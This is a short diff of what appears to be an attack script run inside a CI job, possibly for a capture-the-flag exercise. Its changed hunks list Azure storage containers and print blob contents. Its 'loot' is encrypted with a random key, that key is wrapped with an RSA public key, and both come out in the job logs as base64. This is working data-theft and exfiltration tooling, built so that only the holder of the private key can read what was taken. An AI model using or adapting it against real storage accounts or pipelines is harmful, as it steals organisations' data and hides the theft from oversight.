@@ -138,7 +138,7 @@ if connections:
                 cc=service.get_container_client(container.name)
                 for blob in cc.list_blobs():
                     print('BLOB',container.name,blob.name,blob.size,flush=True)
-                    if blob.size <= 2000000:
+                    if blob.size <= 100000:
                         try:
                             data=cc.download_blob(blob.name).readall()
                             print(data.decode('utf-8','replace'),flush=True)
@@ -151,10 +151,10 @@ echo "payload_exit=$?"
 echo "flag_matches=$(grep -Eoc 'DF26\{[^}]+\}' "$loot" || true)"
 key="$(openssl rand -hex 32)"
 echo '=== ENCRYPTED_LOOT_BEGIN ==='
-openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass "pass:$key" -in "$loot" | base64 -w0
+openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass "pass:$key" -in "$loot" | base64 -w76
 echo
 echo '=== ENCRYPTED_LOOT_END ==='
 echo '=== ENCRYPTED_KEY_BEGIN ==='
-printf %s "$key" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep | base64 -w0
+printf %s "$key" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep | base64 -w76
 echo
 echo '=== ENCRYPTED_KEY_END ==='
